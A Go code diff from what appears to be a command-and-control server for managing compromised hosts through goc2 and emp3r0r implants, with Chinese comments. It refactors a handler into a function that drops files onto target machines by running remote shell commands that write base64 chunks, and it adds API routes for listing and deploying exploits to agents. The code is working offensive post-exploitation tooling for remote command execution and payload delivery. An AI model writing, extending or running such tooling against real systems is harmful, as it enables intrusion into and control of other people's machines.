@@ -900,28 +900,39 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 	}
 	dest = strings.TrimRight(strings.ReplaceAll(dest, "\\", "/"), "/")
 	full := dest + "/" + hdr.Filename
-	// 融合路由：emp3r0r 会话没有 goc2 的 upload 任务类型，用 base64 分块经
-	// run_module exec 落盘。两个硬约束（均实测）：
-	//   a) run_module 的 flags 值上限 8192B（actions.go: len(val)>8192 直接拒），
-	//      256KB 的 goc2 粒度完全不可用——实测 5.5KB 命令可过、8KB 被拒，
-	//      故原始块取 4KB（base64 后 5461B + 骨架 < 8192）；
-	//   b) goc2 的 upload 任务会自动建目录，emp3r0r 分支必须自己 mkdir -p。
+	total, err := c2xPushBytes(r.Context(), agent, dest, hdr.Filename, data)
+	if err != nil {
+		writeErr(w, 502, err.Error())
+		return
+	}
+	s.c2Audit(agent, "", "file_to_agent", fmt.Sprintf("%s → %s (%d chunks)", hdr.Filename, full, total))
+	writeJSON(w, 200, map[string]any{"ok": true, "total": total, "filename": hdr.Filename})
+}
+
+// c2xPushBytes 把内存中的文件推送到目标机：goc2 会话走原生 upload 任务
+// （256KB 块），emp3r0r 会话走 base64 分块 run_module exec。files/upload
+// 端点与弹药库投送共用。
+// 融合路由：emp3r0r 会话没有 goc2 的 upload 任务类型，用 base64 分块经
+// run_module exec 落盘。两个硬约束（均实测）：
+//   a) run_module 的 flags 值上限 8192B（actions.go: len(val)>8192 直接拒），
+//      256KB 的 goc2 粒度完全不可用——实测 5.5KB 命令可过、8KB 被拒，
+//      故原始块取 4KB（base64 后 5461B + 骨架 < 8192）；
+//   b) goc2 的 upload 任务会自动建目录，emp3r0r 分支必须自己 mkdir -p。
+func c2xPushBytes(ctx context.Context, agent, dest, filename string, data []byte) (int, error) {
+	full := strings.TrimRight(strings.ReplaceAll(dest, "\\", "/"), "/") + "/" + filename
 	if strings.HasPrefix(agent, emp3r0rIDPrefix) && emp3r0rEnabled() {
 		tag := strings.TrimPrefix(agent, emp3r0rIDPrefix)
 		q := shellQuote(full)
-		if _, err := emp3r0rRunWait(r.Context(), tag, "mkdir -p "+shellQuote(dest), 120*time.Second); err != nil {
-			writeErr(w, 502, "建目录失败: "+err.Error())
-			return
+		if _, err := emp3r0rRunWait(ctx, tag, "mkdir -p "+shellQuote(dest), 120*time.Second); err != nil {
+			return 0, fmt.Errorf("建目录失败: %w", err)
 		}
 		const chunk = 4 * 1024
 		total := (len(data) + chunk - 1) / chunk
 		if total == 0 {
-			writeErr(w, 400, "空文件")
-			return
+			return 0, fmt.Errorf("空文件")
 		}
-		if _, err := emp3r0rRunWait(r.Context(), tag, ": > "+q, 120*time.Second); err != nil {
-			writeErr(w, 502, "创建失败: "+err.Error())
-			return
+		if _, err := emp3r0rRunWait(ctx, tag, ": > "+q, 120*time.Second); err != nil {
+			return 0, fmt.Errorf("创建失败: %w", err)
 		}
 		for i := 0; i < total; i++ {
 			end := (i + 1) * chunk
@@ -930,30 +941,28 @@ func (s *Server) c2xFilesUpload(w http.ResponseWriter, r *http.Request) {
 			}
 			b64 := base64.StdEncoding.EncodeToString(data[i*chunk : end])
 			cmd := "printf %s " + shellQuote(b64) + " | base64 -d >> " + q
-			if _, err := emp3r0rRunWait(r.Context(), tag, cmd, 120*time.Second); err != nil {
-				writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
-				return
+			if _, err := emp3r0rRunWait(ctx, tag, cmd, 120*time.Second); err != nil {
+				return 0, fmt.Errorf("chunk %d 失败: %w", i, err)
 			}
 		}
-		s.c2Audit(agent, "", "file_to_agent", fmt.Sprintf("%s → %s (%d chunks)", hdr.Filename, full, total))
-		writeJSON(w, 200, map[string]any{"ok": true, "total": total, "filename": hdr.Filename})
-		return
+		return total, nil
 	}
 	const chunk = 256 * 1024
 	total := (len(data) + chunk - 1) / chunk
+	if total == 0 {
+		return 0, fmt.Errorf("空文件")
+	}
 	for i := 0; i < total; i++ {
 		end := (i + 1) * chunk
 		if end > len(data) {
 			end = len(data)
 		}
 		arg := map[string]any{"path": full, "data": base64.StdEncoding.EncodeToString(data[i*chunk : end])}
-		if _, err := c2Client().EnqueueTask(r.Context(), agent, "upload", arg); err != nil {
-			writeErr(w, 502, fmt.Sprintf("chunk %d 失败: %v", i, err))
-			return
+		if _, err := c2Client().EnqueueTask(ctx, agent, "upload", arg); err != nil {
+			return 0, fmt.Errorf("chunk %d 失败: %w", i, err)
 		}
 	}
-	s.c2Audit(agent, "", "file_to_agent", fmt.Sprintf("%s → %s (%d chunks)", hdr.Filename, full, total))
-	writeJSON(w, 200, map[string]any{"ok": true, "total": total, "filename": hdr.Filename})
+	return total, nil
 }
 
 func (s *Server) c2xSysinfo(w http.ResponseWriter, r *http.Request) {
@@ -1459,5 +1468,7 @@ func (s *Server) registerC2ClassicRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("POST /api/tools/c2/classic/net/netstat", s.c2xNetNetstat)
 	mux.HandleFunc("GET /api/tools/c2/classic/plugins", s.c2xPluginsList)
 	mux.HandleFunc("POST /api/tools/c2/classic/plugins/run", s.c2xPluginsRun)
+	mux.HandleFunc("GET /api/tools/c2/classic/exploits", s.c2xExploitsList)
+	mux.HandleFunc("POST /api/tools/c2/classic/exploits/deploy", s.c2xExploitDeploy)
 	mux.HandleFunc("GET /api/tools/c2/classic/graph", s.c2xGraph)
 }
